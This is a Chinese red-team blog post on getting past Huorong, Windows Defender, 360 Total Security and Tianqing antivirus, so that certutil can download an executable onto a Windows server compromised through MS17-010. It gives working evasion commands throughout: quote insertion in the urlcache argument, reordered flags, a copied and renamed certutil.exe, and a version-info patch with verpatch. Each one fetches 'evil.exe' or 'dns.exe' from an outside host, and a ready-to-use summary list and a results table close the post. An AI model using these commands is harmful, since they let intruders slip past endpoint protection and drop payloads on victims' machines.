作者：精灵@深蓝实验室天威战队

## 1.1 前言

在之前某个项目中，遇到一个只能用ms17-010-command打的Windows Server 2008
R2，每次执行输入一条命令，有些特殊符号还不能带入，这台服务器上也有开了核晶防护引擎的360安全卫士，当时简单试了一下添加管理员用户的绕过没成，看来还是得下一个exe进行多人运动。网络上找了一些下载命令变形发现都被拦了，于是本地测试了一下，项目后也顺便测试其他杀软检测效果，我们以常见的certutil为例（其他带下载功能的系统exe绕过思路都是相通的）来探究一下国内常见的杀软的绕过思路。

## 1.2 certutil介绍

首先简单介绍一下Windows系统自带certutil：

> certutil.exe是作为证书服务的一部分安装的命令行程序。 可以使用certutil.exe转储和显示证书颁发机构 (CA)
> 配置信息、配置证书服务、备份和还原 CA 组件，以及验证证书、密钥对和证书链。

更多可以参考微软官方的介绍：<https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/certutil>  
我们一般利用certutil下载文件，常见命令为：  
`certutil -urlcache -split -f http://tianwei.team/evil.exe`  
这里简单介绍一下参数：

  * -urlcache 显示或删除URL缓存条目。无值的命令行选项。

  * -f 覆盖现有文件。有值的命令行选项。后面跟要下载的文件 url。

  * -split 保存到文件。无值的命令行选项。加了的话就可以下载到当前路径，不加就下载到了默认路径。

另外以下命令也是可以正常下载的：  
`certutil -urlcache -f http://tianwei.team/evil.exe dns.exe`

## 1.3 绕过过程

### 1.3.1 火绒绕过

测试环境：win11 x64 物理机 火绒 5.0.68.1 默认配置  
![image](https://image.3001.net/images/20220527/1653639374_629088ce48eacdec1f045.png!small)火绒对默认的下载的语句会拦截。  
`certutil -urlcache -split -f http://tianwei.team/dns.exe`  
![image](https://image.3001.net/images/20220527/1653639640_629089d8b248861d77500.png!small)我们尝试随便添加不存在的-a参数，可以看到火绒也是要拦的。  
`certutil -urlcache -split -f http://tianwei.team/dns.exe -a`  
![image](https://image.3001.net/images/20220527/1653639661_629089edf27e1f5749250.png!small)那我们尝试换过一下参数位置，可以看到火绒不拦截了。  
`certutil -urlcache -split -a -f http://tianwei.team/dns.exe`  
![image](https://image.3001.net/images/20220527/1653639755_62908a4b54db09753270c.png!small)我们只要-a参数换为不影响下载功能的参数即可绕过火绒。  
`certutil -urlcache -split -gmt -f http://tianwei.team/dns.exe`  
![image](https://image.3001.net/images/20220527/1653639777_62908a61c22d19a2a97c5.png!small)从上面测试过程大概推测出火绒是基于正则语句规则进行匹配语句的，基于静态的规则匹配比较鸡肋，我只要稍微变形一下语句不让其不匹配到即可绕过，比如在-split参数前面多加一个空格就绕过了，大家可以随意发挥。  
`certutil -urlcache -split -f http://tianwei.team/dns.exe`  
![image](https://image.3001.net/images/20220527/1653639686_62908a068f5786f097651.png!small)

### 1.3.2 Defender绕过

测试环境：win10 x64 物理机 Windows Defernder 4.18.2203.5-0 默认配置  
![image](https://image.3001.net/images/20220527/1653639898_62908ada31027e17de680.png!small)我们对首先使用默认下载语句测试一下Defernder，可以看到是被Denferder检测到了，而且我们尝试在参数后面加一些干扰字符也无用。  
![image](https://image.3001.net/images/20220527/1653639834_62908a9a1f85962172983.png!small)那我们尝试对参数做一下变形呢，在Windows
cmd中有些字符串是不影响命令原意的，比如^和"。  
![image](https://image.3001.net/images/20220527/1653639959_62908b1768d01aba67395.png!small)那我们可以利用这一特性尝试绕过。  
`certutil -url""""cache -split -f http://tianwei.team/dns.exe`  
![image](https://image.3001.net/images/20220527/1653639984_62908b30482e6d3d7d385.png!small)可以从上图看到当我们在urlcache参数里加入2组""即可绕过Denfender的检测，可以分析出Denfender不只是简单匹配命令语句，也会动态检查运行命令的参数。

### 1.3.3 360绕过

测试环境：物理机 win10 x64 360安全卫士 13.0.0.2003 防护全开 开启核晶防护引擎  
![image](https://image.3001.net/images/20220527/1653639798_62908a76079b4575810ff.png!small)从以往的经验来看，360安全卫士的物理机防护和查杀效果都比虚拟机要强，所以这次我们就用物理机来测，先简单测试一下命令变形，可以看到都被拦截了。  
![image](https://image.3001.net/images/20220527/1653646116_6290a32458a6225b83c21.png!small)那我们试着把参数减少看看情况。  
![image](https://image.3001.net/images/20220527/1653646149_6290a34544b41aa33d4a5.png!small)可以看到我们即使参数缩短到不正常工作的命令行也会拦截，对其参数再怎么变形都无用，有点变态，综上可以看出来是对certutil运行参数进行了动态检测，只要动态执行后的参数有-urlcache就拦截。  
既然对certutil检测那么严，那我们换换思路，给certutil换个路径和文件名看看。  
`copy c:\windows\system32\certutil.exe c.exe`  
![image](https://image.3001.net/images/20220527/1653646173_6290a35d04e91c2cc8215.png!small)可以看到执行c
-urlcache不再拦截了，说明思路可行，那我们再次加上其他参数看看情况呢，可以看到成功绕过。  
`c -urlcache -split -f http://tianwei.team/dns.exe`  
![image](https://image.3001.net/images/20220527/1653646221_6290a38d01cb023b2ff72.png!small)

### 1.3.4 天擎绕过

测试环境：虚拟机 win7sp1 x64 天擎 v10.3.0.2009 防护全开  
![image](https://image.3001.net/images/20220527/1653646242_6290a3a2440618a283b6b.png!small)  
首先还是先测试一下命令参数变形的情况，可以看到都拦截了。  
![image](https://image.3001.net/images/20220527/1653646269_6290a3bdd29de9a5ca2f2.png!small)  
我们再加入更复杂的变形也不行。  
![image](https://image.3001.net/images/20220527/1653646297_6290a3d962e050720a113.png!small)  
试一下过360的思路，还是被拦了。  
![image](https://image.3001.net/images/20220527/1653646322_6290a3f2e60028f09af49.png!small)  
既然有静态的参数urlcache就被拦，那动态拼接出参数urlcache呢？  
我们用set命令进行赋值，把参数urlcache进行拆分，然后用call命令来调用，用%a1%格式来拼接出参数urlcache，可以到看到还是被拦了，看来天擎是程序运行后再获取到实际的参数再做匹配的，可以的，很强。  
![image](https://image.3001.net/images/20220527/1653646339_6290a403119841f1efb6a.png!small)  
测到这里看来普通的参数字符变形是行不通的，我们换换思路，加入其他的命令进行变形看看情况呢。  
![image](https://image.3001.net/images/20220527/1653646354_6290a412414e6c5d8f7b0.png!small)  
还是被拦了，不过看之前的拦截信息，父进程来源都是cmd.exe，那我们试一下改变其父进程呢，改变其进程链，使用pcalua启动certutil。  
![image](https://image.3001.net/images/20220527/1653646367_6290a41f58fbf2a188312.png!small)  
好家伙，尝试使用其他方式调用certutil还是不行，估计是不管其启动父进程，只要天擎识别到启动的是certutil并且带有urlcache参数就会拦截。  
既然这样，那我们思路就有了，只要让天擎不识别到为certutil是不是就可以绕过了，首先想到的天擎可能是根据程序的哈希值进行识别的，那我们尝试改变certutil的hash试试，把calc.exe附加到certutil的后面，这样既改变了certutil的hash而且也不影响certutil的正常执行。  
![image](https://image.3001.net/images/20220527/1653646384_6290a43080ca66bf7d049.png!small)  
可以看到，从拦截信息来看还是把new识别为certutil，我们看一下new的[版本信息](https://docs.microsoft.com/zh-cn/windows/win32/menurc/version-information)也还是certutil的。  
![image](https://image.3001.net/images/20220527/1653646406_6290a44635582e53094e6.png!small)  
所以推测杀软是根据程序版本信息进行识别的，我们尝试修改程序版本信息看看能否绕过。  
为了验证这个思路，网上找了一圈没有发现系统自带的命令可以修改程序版本信息，无奈之下找到一个三方的小巧好用的修改工具[verpatch](https://www.codeproject.com/Articles/37133/Simple-Version-Resource-Tool-for-Windows)，经过测试只需要修改程序版本信息中InternalName字段的值，这里我们InternalName修改为空看看情况。  
`verpatch.exe c.exe /s InternalName ""`  
![image](https://image.3001.net/images/20220527/1653646423_6290a4571d296374c058b.png!small)  
可以看到天擎已经不识别为certuitl了，正常的下载也不再拦截了。  
![image](https://image.3001.net/images/20220527/1653646434_6290a4629338cbdfb41cf.png!small)  
不过到这里我们已经借助了三方工具来修改程序元数据，所以此时的绕过意义已经不大了，只能说明这个绕过思路是可行的，在一些其他场景可以发挥作用。

## 1.4 绕过操作

火绒绕过（随意发挥）

    
    
    certutil -urlcache  -split -f http://tianwei.team/dns.exe
    certutil -urlcache -split -gmt -f http://tianwei.team/dns.exe
    certutil -url""cache -split -f http://tianwei.team/dns.exe
    

Defender绕过

    
    
    certutil -url""""cache -split -f http://tianwei.team/dns.exe
    

360绕过

    
    
    certutil|certutil -urlcache split -f http://tianwei.team/dns.exe
    copy c:\windows\system32\certutil.exe c.exe
    c -urlcache -split -f http://tianwei.team/dns.exe
    

天擎绕过

    
    
    copy c:\windows\system32\certutil.exe c.exe
    verpatch.exe c.exe /s InternalName ""
    certutil -urlcache  -split -f http://tianwei.team/dns.exe
    

## 1.5 测试结果

测试时间：2022年5月24-26日

测试环境| 杀软| 版本| 能否绕过  
---|---|---|---  
win10 物理机| 火绒| 5.0.68.1| 可以  
win11 物理机| Windows Defender| 4.18.2203.5-0| 可以  
win10 物理机| 360安全卫士| 13.0.0.2003| 可以  
win7 sp1 虚拟机| 天擎| v10.3.0.2009| 特定场景可以  
  
## 1.6 后话

在测试天擎后，询问团队里大佬有无姿势，大佬反手就是一发绕过命令，原理还是urlcache进行变形，因为不管怎么样杀软获取到实际参数还是要做正则匹配，那我们只要加一些既不影响命令原意又能打断正则匹配的符号就行了，大家往这个方向fuzz也可以达到目的。

